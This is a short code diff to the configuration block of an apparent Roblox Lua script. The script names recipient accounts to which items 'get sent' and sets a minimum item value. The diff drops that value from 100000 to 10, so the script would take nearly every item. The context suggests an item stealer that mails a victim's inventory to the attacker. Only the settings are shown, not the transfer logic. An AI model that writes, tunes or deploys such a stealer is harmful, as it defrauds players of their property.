@@ -1,6 +1,6 @@
 Username = "ROCGMC"
 Username2 = "ROCGMCx2" -- stuff will get sent to this user if first user's mailbox is full
-min_rap =  100000 -- minimum rap of each item you want to get sent to you. 1 mil by default
+min_rap =  10 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
